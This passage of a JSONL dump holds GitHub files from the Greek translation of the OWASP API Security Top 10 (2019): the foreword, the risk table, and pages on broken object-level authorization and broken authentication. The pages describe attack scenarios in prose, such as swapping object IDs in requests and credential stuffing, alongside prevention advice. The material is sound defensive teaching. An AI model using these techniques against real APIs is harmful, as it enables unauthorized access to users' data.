επαναχρησιμοποιήσετε ή \nνα διανέμετε, θα πρέπει να καταστήσετε σαφές στους άλλους τους όρους άδειας χρήσης αυτού του έργου.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:21.806738"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x02-foreword.md", "content": "# Πρόλογος\n\nΈνα θεμελιώδες στοιχείο καινοτομίας στον σημερινό κόσμο που βασίζεται στις εφαρμογές\nείναι η διεπαφή προγραμματισμού εφαρμογών (API). Από τις τράπεζες, το λιανικό εμπόριο \nκαι τις μεταφορές έως το IoT, τα αυτόνομα οχήματα και τις έξυπνες πόλεις, τα API \nαποτελούν κρίσιμο μέρος των σύγχρονων εφαρμογών για κινητά, SaaS και web. Τα API μπορούν \nνα βρεθούν σε εφαρμογές που απευθύνονται σε πελάτες, σε εφαρμογές που απευθύνονται σε \nσυνεργάτες και σε ενδοεταιρικές εφαρμογές.\n\nΑπό τη φύση τους, τα APIs αφήνουν εκτεθειμένες ορισμένες πτυχές της επιχειρηματικής λογικής της εφαρμογής (business logic) καθώς και ευαίσθητα δεδομένα όπως οι Προσωπικές Αναγνωριστικές Πληροφορίες (PII) (Σ.τ.Μ. πληροφορίες που επιτρέπουν την αναγνώριση προσώπου). Γι' αυτό τον λόγο τα API γίνονται όλο και περισσότερο στόχος κακόβουλων χρηστών. Χωρίς ασφαλή APIs, η ταχεία καινοτομία θα ήταν αδύνατη.\n\nΠαρόλο που ένα γενικευμένο Top 10 με κινδύνους ασφαλείας για web εφαρμογές\nεξακολουθεί να έχει νόημα, λόγω της ιδιαίτερης φύσης των APIs, απαιτείται μια λίστα \nρίσκων ασφαλείας ειδικά για τα API. Η ασφάλεια των APIs εστιάζει σε στρατηγικές \nκαι λύσεις για την κατανόηση και την αντιμετώπιση των μοναδικών τρωτών σημείων \nκαι ρίσκων ασφαλείας που σχετίζονται με τα APIs.\n\nΕάν είστε εξοικειωμένοι με το [OWASP Top 10 Project][1], τότε θα παρατηρήσετε \nτις ομοιότητες μεταξύ των δύο καταγραφών: στόχος τους είναι η εύκολη ανάγνωση (readability)\nκαι εύκολη υιοθέτηση (adoption). Εάν είστε νέος στη σειρά OWASP Top 10 ίσως είναι καλύτερα \nνα διαβάσετε τις ενότητες [Ρίσκα Ασφαλείας API][2] και [Μεθοδολογία και Δεδομένα][3] \nπριν μεταβείτε στη λίστα Top 10.\n\nΜπορείτε να συνεισφέρετε στο OWASP API Security Top 10 με τις ερωτήσεις, \nτα σχόλια και τις ιδέες σας στο ηλεκτρονικό «αποθετήριο» (repository) του έργου στο GitHub:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nΜπορείτε να βρείτε το OWASP API Security Top 10 εδώ:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nΘέλουμε να ευχαριστήσουμε όλους τους συντελεστές που κατέστησαν δυνατό αυτό \nτο έργο με την προσπάθεια και τη συνεισφορά τους. Όλοι τους αναφέρονται στην ενότητα \n[Ευχαριστίες][4]. Σας ευχαριστούμε!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:21.912780"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x03-introduction.md", "content": "# Εισαγωγή\n\n## Καλώς ήρθατε στο OWASP API Security Top 10 - 2019!\n\nΚαλώς ήρθατε στην πρώτη έκδοση του OWASP API Security Top 10. Εάν είστε \nεξοικειωμένοι με τη σειρά OWASP Top 10 τότε θα παρατηρήσετε \nτις ομοιότητες μεταξύ των δύο καταγραφών: στόχος τους είναι η εύκολη ανάγνωση (readability) και η εύκολη υιοθέτηση (adoption). Σε διαφορετική περίπτωση, εξετάστε το ενδεχόμενο να επισκεφτείτε τη σελίδα [OWASP API Security Project wiki][1] προτού εμβαθύνετε στους πιο κρίσιμους κινδύνους για την ασφάλεια των APIs.\n\nΤα APIs παίζουν πολύ σημαντικό ρόλο στην αρχιτεκτονική των σύγχρονων εφαρμογών. \nΕφόσον η δράση ευαισθητοποίησης του κοινού για την ασφάλεια και η καινοτομία έχουν \nδιαφορετικούς ρυθμούς, είναι σημαντικό να εστιάσετε στις συνηθισμένες αδυναμίες \nασφαλείας APIs.\n\nΟ πρωταρχικός στόχος του OWASP API Security Top 10 είναι να εκπαιδεύσει όσους \nεμπλέκονται στην ανάπτυξη και συντήρηση APIs, για παράδειγμα, προγραμματιστές, \nσχεδιαστές, αρχιτέκτονες, διαχειριστές ή επιχειρήσεις / οργανισμούς.\n\nΣτην ενότητα [Μεθοδολογία και Δεδομένα][2], μπορείτε να διαβάσετε περισσότερα \nγια το πώς δημιουργήθηκε αυτή η πρώτη έκδοση. Σε μελλοντικές εκδόσεις, θέλουμε \nνα συνεργαστούμε με τις επιχειρήσεις του τομέα της ασφαλείας εφαρμογών (security industry), με μια δημόσια πρόσκληση για διαμοιρασμό δεδομένων. Προς το παρόν, ενθαρρύνουμε όλους να συνεισφέρουν με ερωτήσεις, σχόλια και ιδέες \nστο [αποθετήριο (repository) GitHub][3] ή στη [Λίστα αλληλογραφίας][4].\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:22.016982"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x04-release-notes.md", "content": "# Σημειώσεις Έκδοσης\n\nΑυτή είναι η πρώτη έκδοση του OWASP API Security Top 10. Σκοπός μας είναι η έκδοση να \nενημερώνεται περιοδικά κάθε τρία ή τέσσερα χρόνια.\n\nΣε μελλοντικές εκδόσεις, σε αντίθεση με την παρούσα έκδοση, θέλουμε να κάνουμε \nμια δημόσια πρόσκληση για δεδομένα, σε συνεργασία με τις επιχειρήσεις του τομέα της ασφάλειας εφαρμογών (security industry) σε αυτή την προσπάθεια. Στην ενότητα [Μεθοδολογία και Δεδομένα][1] θα βρείτε περισσότερες πληροφορίες σχετικά με τον τρόπο δημιουργίας αυτής της έκδοσης. Για περισσότερες λεπτομέρειες σχετικά με τους κινδύνους ασφαλείας, ανατρέξτε στην ενότητα [Ρίσκα Ασφαλείας API][2].\n\nΕίναι σημαντικό να συνειδητοποιήσουμε ότι τα τελευταία χρόνια, η αρχιτεκτονική των εφαρμογών έχει αλλάξει σημαντικά. Επί του παρόντος, τα APIs διαδραματίζουν πολύ σημαντικό ρόλο σε αυτή τη νέα αρχιτεκτονική των μικροϋπηρεσιών (microservices), των εφαρμογών μιας σελίδας (SPA), των εφαρμογών για κινητά, του IoT κ.λπ.\n\nΤο OWASP API Security Top 10 ήταν μια απαραίτητη προσπάθεια για την ευαισθητοποίηση του κοινού σχετικά με τα σύγχρονα ζητήματα ασφαλείας των APIs. Αυτό ήταν εφικτό μόνο χάρη στη σημαντική προσπάθεια πολλών εθελοντών οι οποίοι αναφέρονται στην ενότητα [Ευχαριστίες][3]. Σας ευχαριστούμε!\n\nΣημειώσεις Μετάφρασης\n=====================\n\nΗ μετάφραση του OWASP API Security Top 10 2019 πραγματοποιήθηκε εθελοντικά με στόχο να γίνει η \nκαταγραφή προσβάσιμη και στην ελληνική γλώσσα.\n\nΠιστεύουμε ότι αυτή είναι μια ουσιαστική συνεισφορά στην αποστολή της ευαισθητοποίησης και της \nεκπαίδευσης όλων όσων εμπλέκονται στην ανάπτυξη και συντήρηση APIs και λογισμικού γενικότερα για \nθέματα που σχετίζονται με την ασφάλεια.\n\nΗ ελληνική μετάφραση προέκυψε από την προσπάθεια των παρακάτω:\n- Athanasios Emmanouilidis https://www.linkedin.com/in/athanasiosem/\n- Apostolos Giannakidis https://www.linkedin.com/in/giannakidisapostolos/\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:22.120604"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x10-api-security-risks.md", "content": "# Ρίσκα Ασφαλείας API\n\nΓια την ανάλυση κινδύνου χρησιμοποιήθηκε η [Μεθοδολογία Αξιολόγησης Ρίσκου OWASP][1].\n\nΟ παρακάτω πίνακας συνοψίζει την ορολογία που σχετίζεται με τη βαθμολογία κινδύνου.\n\n| Παράγοντες Απειλής (Threat Agents) | Εκμεταλλευσιμότητα (Exploitability) | Επικράτηση Αδυναμίας (Weakness Prevalence) | Ανιχνευσιμότητα Αδυναμίας (Weakness Detectability) | Τεχνικός Αντίκτυπος (Technical Impact) | Επιχειρησιακές Επιπτώσεις (Business Impacts) |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Εξαρτώνται από το API | Εύκολη: **3** | Διαδεδομένη **3** | Εύκολη **3** | Σοβαρός **3** | Εξαρτώνται από την επιχείρηση |\n| Εξαρτώνται από το API | Μεσαία: **2** | Κοινή **2** | Μεσαία **2** | Μεσαίος **2** | Εξαρτώνται από την επιχείρηση |\n| Εξαρτώνται από το API | Δύσκολη: **1** | Δύσκολη **1** | Δύσκολη **1** | Μικρός **1** | Εξαρτώνται από την επιχείρηση |\n\nΣημείωση: Η παραπάνω προσέγγιση δεν λαμβάνει υπόψη την πιθανότητα του παράγοντα απειλής (likelihood of threat agent). Επίσης δεν λαμβάνει υπόψη καμία από τις διάφορες τεχνικές λεπτομέρειες που σχετίζονται με τη συγκεκριμένη εφαρμογή σας. Οποιοσδήποτε από αυτούς τους παράγοντες θα μπορούσε να επηρεάσει σημαντικά τη συνολική πιθανότητα ο εισβολέας να βρει και να εκμεταλλευτεί μια συγκεκριμένη ευπάθεια. Αυτή η βαθμολογία δεν λαμβάνει υπόψη τον πραγματικό αντίκτυπο στην επιχείρησή σας. Η επιχείρηση/οργανισμός σας θα πρέπει να αποφασίσει πόσο ρίσκο ασφαλείας από τις εφαρμογές και τα APIs είναι διατεθειμένος να αποδεχτεί, δεδομένης της εταιρικής κουλτούρας/πολιτικών, του κλάδου και του ρυθμιστικού περιβάλλοντος. Ο σκοπός του OWASP API Security Top 10 δεν είναι να κάνει αυτήν την ανάλυση κινδύνου για εσάς.\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Εξωτερικές Αναφορές\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:22.333657"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x11-t10.md", "content": "# OWASP Τα 10 Κορυφαία Ρίσκα Ασφαλείας API – 2019\n\n| Ρίσκο | Περιγραφή |\n| ---- | ----------- |\n| API1:2019 - Broken Object Level Authorization | Πολύ συχνά, τα APIs εκθέτουν τελικά σημεία προορισμού (endpoints) που χειρίζονται αναγνωριστικά αντικειμένων (object IDs), δημιουργώντας μία ευρεία επιφάνεια έκθεσης σε πιθανές επιθέσεις επιπέδου ελέγχου πρόσβασης (wide attack surface Level Access Control). Οι έλεγχοι εξουσιοδότησης σε επίπεδο αντικειμένου (Object Level Authorization) θα πρέπει να λαμβάνονται υπόψη σε κάθε λειτουργία που έχει πρόσβαση σε δεδομένα προερχόμενα από χρήστες. |\n| API2:2019 - Broken User Authentication | Οι μηχανισμοί ελέγχου ταυτότητας χρηστών συχνά υλοποιούνται εσφαλμένα, επιτρέποντας στους εισβολείς να διακυβεύουν τα διακριτικά ελέγχου ταυτότητας ή να εκμεταλλεύονται ελαττώματα στην υλοποίηση της εφαρμογής για να προσποιούνται προσωρινά ή μόνιμα τις ταυτότητες άλλων χρηστών. Όταν διακυβεύεται η ικανότητα του συστήματος να αναγνωρίζει τον χρήστη / εφαρμογή-πελάτη (client) τότε θέτεται σε κίνδυνο η ασφάλεια των APIs συνολικά. |\n| API3:2019 - Excessive Data Exposure | Στοχεύοντας σε γενικευμένες υλοποιήσεις (generic implementations), οι προγραμματιστές τείνουν να εκθέτουν όλα τα δεδομένα/ιδιότητες των αντικειμένων (object properties) χωρίς να λαμβάνουν υπόψη την ατομική τους ευαισθησία/εμπιστευτικότητα, βασιζόμενοι ότι οι εφαρμογές-πελάτες θα εκτελέσουν το φιλτράρισμα δεδομένων πριν τα εμφανίσουν στον χρήστη. |\n| API4:2019 - Lack of Resources & Rate Limiting | Πολύ συχνά, τα APIs δεν επιβάλλουν περιορισμούς στο μέγεθος ή τον αριθμό των πόρων που μπορεί να ζητήσει ο χρήστης / εφαρμογή-πελάτη (client). Αυτό όχι μόνο μπορεί να επηρεάσει την απόδοση του διακομιστή API, οδηγώντας σε άρνηση υπηρεσίας (DoS), αλλά αφήνει επίσης ανοιχτό το ενδεχόμενο ελαττωμάτων ελέγχου ταυτότητας, όπως η ωμή βία (brute force). |\n| API5:2019 - Broken Function Level Authorization | Πολύπλοκες πολιτικές ελέγχου πρόσβασης με διαφορετικές ιεραρχίες, ομάδες και ρόλους, καθώς και ασαφείς διαχωρισμοί μεταξύ διαχειριστικών/διαβαθμισμένων (administrative) και μη-διαβαθμισμένων λειτουργιών, τείνουν να οδηγούν σε ελαττώματα εξουσιοδότησης. Εκμεταλλευόμενοι αυτά τα ζητήματα, οι εισβολείς αποκτούν πρόσβαση σε πόρους ή/και διαβαθμισμένες λειτουργίες άλλων χρηστών. |\n| API6:2019 - Mass Assignment | Η σύνδεση δεδομένων που προέρχονται από χρήστες ή εφαρμογές-πελάτες (π.χ. JSON) σε μοντέλα δεδομένων, χωρίς το κατάλληλο φιλτράρισμα ιδιοτήτων βάσει μιας λίστας επιτρεπόμενων δεδομένων (whitelist), συνήθως οδηγεί σε μαζική εκχώρηση δεδομένων (Mass Assignment). Οι εισβολείς καταφέρνουν να τροποποιήσουν τις ιδιότητες αντικειμένων που δεν θα έπρεπε να έχουν πρόσβαση να τροποποιήσουν με διάφορους τρόπους, όπως με το να μαντεύουν τις ιδιότητες των αντικειμένων, την εξερεύνηση άλλων τελικών σημείων προορισμού (API endpoints), την μελέτη της τεκμηρίωσης του λογισμικού (documentation) ή την παροχή πρόσθετων ιδιοτήτων αντικειμένων σε ωφέλιμα φορτία αιτημάτων (request payloads).\n| API7:2019 - Security Misconfiguration | Οι εσφαλμένες ρυθμίσεις ασφαλείας είναι συνήθως αποτέλεσμα μη ασφαλών προεπιλεγμένων ρυθμίσεων, ελλιπών ή αυτοσχέδιων/πρόχειρων (ad-hoc) ρυθμίσεων, χώρου αποθήκευσης cloud με ελλιπείς ή χωρίς περιορισμούς χρήσης, εσφαλμένων ρυθμίσεων κεφαλίδων HTTP (headers), περιττών μεθόδων HTTP, επιτρεπόμενης κοινής χρήσης πόρων Cross-Origin (CORS) και λεπτομερών μηνυμάτων σφάλματος που περιέχουν ευαίσθητες πληροφορίες. |\n| API8:2019 - Injection | Σφάλματα Έγχυσης (Injection Flaws), όπως SQL, NoSQL, Command Injection κ.λπ., συμβαίνουν όταν αποστέλλονται μη αξιόπιστα δεδομένα σε έναν διερμηνέα λογισμικού ως μέρος μιας εντολής ή ερωτήματος (query). Τα κακόβουλα δεδομένα του εισβολέα μπορούν να ξεγελάσουν τον διερμηνέα ώστε να εκτελέσει ακούσιες εντολές ή να αποκτήσει πρόσβαση σε δεδομένα χωρίς την κατάλληλη εξουσιοδότηση. |\n| API9:2019 - Improper Assets Management | Τα APIs τείνουν να εκθέτουν περισσότερα τελικά σημεία προορισμού (endpoints) από τις παραδοσιακές εφαρμογές Ιστού, καθιστώντας τη σωστή και ενημερωμένη τεκμηρίωση (documentation) εξαιρετικά σημαντική. Επίσης σημαντικό ρόλο για τον μετριασμό ελαττωμάτων όπως οι καταργημένες εκδόσεις APIs και τα εκτεθειμένα τελικά σημεία εντοπισμού σφαλμάτων είναι η μεθοδική καταγραφή των servers και των εκδόσεων APIs που έχουν αναπτυχθεί. |\n| API10:2019 - Insufficient Logging & Monitoring | Η ανεπαρκής καταγραφή και παρακολούθηση/εποπτεία, σε συνδυασμό με την έλλειψη ή την αναποτελεσματική ενσωµάτωση και διαλειτουργικότητα με την αντιμετώπιση συμβάντων (incident response), επιτρέπει στους επιτιθέμενους να επεκτείνουν τις επιθέσεις τους, να διατηρήσουν την πρόσβαση τους, να στραφούν σε περισσότερα συστήματα για να παραβιάσουν, να εξαγάγουν ή να καταστρέψουν δεδομένα. Οι περισσότερες μελέτες παραβίασης αποδεικνύουν ότι ο μέσος χρόνος που απαιτείται για τον εντοπισμό μιας παραβίασης ξεπερνάει τις 200 ημέρες και συνήθως εντοπίζεται από εξωτερικούς συνεργάτες και όχι από ενδοεταιρικές διαδικασίες ή παρακολούθηση/εποπτεία των συστημάτων. |\n", "timestamp": "2025-10-24T22:26:22.566910"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **3** : Ανιχνευσιμότητα **2** | Τεχνικές Επιπτώσεις **3** : Εξαρτώνται από την Επιχείρηση |\n| Οι εισβολείς μπορούν να εκμεταλλευτούν τελικά σημεία προορισμού API (endpoints) που είναι ευάλωτα σε εσφαλμένη εξουσιοδότηση επιπέδου αντικειμένου (Broken Object Level Authorization), παραποιώντας το αναγνωριστικό ενός αντικειμένου (object ID) που αποστέλλεται εντός ενός αιτήματος (request). Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση σε ευαίσθητα δεδομένα. Αυτό το κενό ασφαλείας είναι εξαιρετικά κοινό σε εφαρμογές που βασίζονται σε API, επειδή ο διακομιστής (server) συνήθως δεν έχει γνώση της κατάστασης της εφαρμογής-πελάτη και, αντ' αυτού, βασίζεται σε παραμέτρους όπως τα αναγνωριστικά αντικειμένων, που αποστέλλονται από την εφαρμογή-πελάτη για να αποφασίσει σε ποια αντικείμενα θα έχει πρόσβαση. | Αυτή είναι η πιο κοινή και ιδιαίτερα αποτελεσματική επίθεση σε API. Οι μηχανισμοί εξουσιοδότησης και ελέγχου πρόσβασης στις σύγχρονες εφαρμογές είναι περίπλοκοι και ευρέως διαδεδομένοι. Ακόμα κι αν η εφαρμογή εφαρμόζει μια κατάλληλη υποδομή για ελέγχους εξουσιοδότησης, οι προγραμματιστές μπορεί να ξεχάσουν να χρησιμοποιήσουν αυτούς τους ελέγχους πριν παραχωρήσουν πρόσβαση σε ένα ευαίσθητο/διαβαθμισμένο αντικείμενο. Η ανίχνευση ελέγχου πρόσβασης συνήθως δεν υπόκειται σε αυτοματοποιημένους στατικούς ή δυναμικούς ελέγχους (static or dynamic testing). | Η μη εξουσιοδοτημένη πρόσβαση μπορεί να οδηγήσει σε αποκάλυψη δεδομένων σε μη εξουσιοδοτημένα μέρη, απώλεια δεδομένων ή παραποίηση δεδομένων. Η μη εξουσιοδοτημένη πρόσβαση σε αντικείμενα μπορεί επίσης να οδηγήσει τους επιτιθέμενους να αποκτήσουν πλήρη πρόσβαση του λογαριασμού ενός χρήστη (account takeover). |\n\n## Πότε το API είναι ευάλωτο\n\nΗ εξουσιοδότηση επιπέδου αντικειμένου (Object Level Authorization) είναι ένας μηχανισμός ελέγχου πρόσβασης \nπου συνήθως υλοποιείται σε επίπεδο κώδικα για να επιβεβαιώσει ότι ένας χρήστης \nμπορεί να έχει πρόσβαση μόνο σε αντικείμενα (objects) στα οποία θα έπρεπε να έχει πρόσβαση.\n\nΚάθε τελικό σημείο προορισμού API (endpoint) που λαμβάνει ένα αναγνωριστικό ενός αντικειμένου (object ID) και εκτελεί \nοποιονδήποτε τύπο ενέργειας στο αντικείμενο, θα πρέπει να εφαρμόζει ελέγχους εξουσιοδότησης \nσε επίπεδο αντικειμένου. Οι έλεγχοι θα πρέπει να επικυρώνουν ότι ο συνδεδεμένος χρήστης \nέχει πρόσβαση για να εκτελέσει την απαιτούμενη ενέργεια στο ζητούμενο αντικείμενο.\n\nΟι αποτυχίες σε αυτόν τον μηχανισμό συνήθως οδηγούν σε μη εξουσιοδοτημένη αποκάλυψη \nπληροφοριών, τροποποίηση ή καταστροφή όλων των δεδομένων.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΜια πλατφόρμα ηλεκτρονικού εμπορίου για ηλεκτρονικά καταστήματα παρέχει μια σελίδα \nμε τα διαγράμματα εσόδων για τα καταστήματα που φιλοξενεί. Επιθεωρώντας \nτα αιτήματα του προγράμματος περιήγησης (browser requests), ένας εισβολέας μπορεί να αναγνωρίσει τα \nτελικά σημεία προορισμού API (endpoints) που χρησιμοποιούνται ως πηγή δεδομένων για αυτά τα γραφήματα \nκαι το μοτίβο URL τους το οποίο είναι της μορφής: `/shops/{shopName}/revenue_data.json`. Χρησιμοποιώντας ένα άλλο \nτελικό σημείο προορισμού API (endpoint), ο εισβολέας λαμβάνει τη λίστα με όλα τα ονόματα καταστημάτων \nπου φιλοξενούνται. Ο εισβολέας χρησιμοποιεί ένα απλό script, το οποίο διαχειρίζεται τα ονόματα στη λίστα, αντικαθιστώντας \nτο `{shopName}` στη διεύθυνση URL. Με αυτό τον τρόπο αποκτά πρόσβαση στα δεδομένα πωλήσεων \nχιλιάδων καταστημάτων ηλεκτρονικού εμπορίου.\n\n### Σενάριο Επίθεσης #2\n\nΚατά την παρακολούθηση της κυκλοφορίας δικτύου μιας φορητής συσκευής, το ακόλουθο \nαίτημα HTTP `PATCH` τραβά την προσοχή ενός εισβολέα λόγω της παρουσίας μιας \ncustom κεφαλίδας αιτήματος HTTP `X-User-Id: 54796`. Αντικαθιστώντας την \nτιμή `X-User-Id` με `54795`, ο εισβολέας λαμβάνει μια επιτυχημένη απάντηση HTTP \nκαι μπορεί να τροποποιήσει τα δεδομένα λογαριασμού άλλων χρηστών.\n\n## Τρόπος Πρόληψης\n\n* Δημιουργήστε έναν σωστό μηχανισμό εξουσιοδότησης που βασίζεται στις πολιτικές των χρηστών (user policies) και την ιεραρχία τους.\n* Χρησιμοποιήστε έναν μηχανισμό εξουσιοδότησης σε κάθε συνάρτηση (function) που χρησιμοποιεί δεδομένα εισόδου από τη εφαρμογή-πελάτη (client) για να αποκτήσει πρόσβαση σε μια εγγραφή στη βάση δεδομένων. Ο μηχανισμός πρέπει να ελέγχει εάν ο συνδεδεμένος \nχρήστης έχει πρόσβαση να εκτελέσει την απαιτούμενη ενέργεια στην εγγραφή.\n* Προτιμήστε να χρησιμοποιείτε τυχαίες και απρόβλεπτες τιμές ως GUID για τα \nαναγνωριστικά (object IDs) των εγγραφών.\n* Γράψτε αυτοματοποιημένους ελέγχους (tests) για την αξιολόγηση του μηχανισμού εξουσιοδότησης. Μην βγάζετε στην παραγωγή (deploy) ευάλωτες αλλαγές που σπάνε τα tests.\n\n## Αναφορές (References)\n\n### Εξωτερικές Αναφορές\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:22.791738"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **2** : Ανιχνευσιμότητα **2** | Τεχνικές Επιπτώσεις **3** : Εξαρτώνται από την Επιχείρηση |\n| Ο έλεγχος ταυτότητας στα APIs είναι ένας πολύπλοκος και μπερδεμένος μηχανισμός. Οι μηχανικοί λογισμικού και ασφαλείας ενδέχεται να έχουν λανθασμένες αντιλήψεις σχετικά με τα όρια του ελέγχου ταυτότητας και πώς να τον εφαρμόσουν σωστά. Επιπλέον, ο μηχανισμός ελέγχου ταυτότητας είναι ένας εύκολος στόχος για τους εισβολείς, καθώς είναι προσβάσιμος σε όλους. Αυτοί οι δύο λόγοι καθιστούν τον μηχανισμό ελέγχου ταυτότητας δυνητικά ευάλωτο σε πολλές επιθέσεις (exploits). | Υπάρχουν δύο υποκατηγορίες του κενού ασφαλείας: 1. Έλλειψη μηχανισμών προστασίας: Τα τελικά σημεία προορισμού APIs που είναι υπεύθυνα για τον έλεγχο ταυτότητας πρέπει να αντιμετωπίζονται διαφορετικά από τα κανονικά τελικά σημεία προορισμού και να εφαρμόζουν επιπλέον επίπεδα προστασίας. 2. Εσφαλμένη εφαρμογή του μηχανισμού: Ο μηχανισμός χρησιμοποιείται / υλοποιείται χωρίς να λαμβάνονται υπόψη τα διανύσματα επίθεσης (attack vectors) ή είναι λάθος η περίπτωση χρήσης του (π.χ. ένας μηχανισμός ελέγχου ταυτότητας που έχει σχεδιαστεί για εφαρμογές-πελάτες (clients) IoT μπορεί να μην είναι η σωστή επιλογή για εφαρμογές Ιστού). | Οι εισβολείς μπορούν να αποκτήσουν τον έλεγχο λογαριασμών άλλων χρηστών στο σύστημα, να διαβάσουν τα προσωπικά τους δεδομένα και να εκτελέσουν ευαίσθητες / διαβαθμισμένες ενέργειες για λογαριασμό τους, όπως συναλλαγές χρημάτων και αποστολή προσωπικών μηνυμάτων. |\n\n## Πότε το API είναι ευάλωτο\n\nΤα τελικά σημεία προορισμού (endpoints) και οι ροές (flows) ελέγχου ταυτότητας είναι στοιχεία που πρέπει να προστατεύονται. Λειτουργίες όπως το \"Ξέχασα τον κωδικό πρόσβασης / επαναφορά κωδικού πρόσβασης\" θα πρέπει να αντιμετωπίζονται με τον ίδιο τρόπο όπως και οι μηχανισμοί ελέγχου ταυτότητας.\n\nΈνα API είναι ευάλωτο εάν:\n* Επιτρέπει [credential stuffing][1] με το οποίο ο εισβολέας έχει την δυνατότητα να αυτοματοποιήσει την προσπάθεια πρόσβασης χρησιμοποιώντας κλεμμένες λίστες με έγκυρα ονόματα χρηστών και κωδικών πρόσβασης.\n* Επιτρέπει στους εισβολείς να εκτελούν επίθεση ωμής βίας (brute force attack) στον ίδιο λογαριασμό χρήστη, χωρίς να παρουσιάζουν μηχανισμό captcha ή κλειδώματος λογαριασμού.\n* Επιτρέπει αδύναμους κωδικούς πρόσβασης.\n* Στέλνει ευαίσθητες λεπτομέρειες ελέγχου ταυτότητας, όπως διακριτικά ταυτότητας (authentication tokens) και κωδικούς πρόσβασης στη διεύθυνση URL (δηλαδή μέσω χρήσης GET HTTP requests).\n* Δεν επικυρώνει την αυθεντικότητα των διακριτικών.\n* Αποδέχεται ανυπόγραφα/ασθενώς υπογεγραμμένα διακριτικά JWT (`\"alg\":\"none\"`)/δεν επικυρώνει την ημερομηνία λήξης τους.\n* Διαχειρίζεται κωδικούς πρόσβασης ως απλό κείμενο, χωρίς την χρήση κρυπτογράφησης ή χρησιμοποιεί αδύναμους αλγόριθμους κρυπτογράφησης ή κατακερματισμού (hashing).\n* Χρησιμοποιεί αδύναμα κλειδιά κρυπτογράφησης.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n## Σενάριο Επίθεσης #1\n\nΤο [Credential stuffing][1] (χρησιμοποιώντας [λίστες γνωστών ονομάτων χρήστη/κωδικών πρόσβασης][2]), είναι μια συνηθισμένη επίθεση. Εάν μια εφαρμογή δεν εφαρμόζει προστασία από αυτοματοποιημένες απειλές 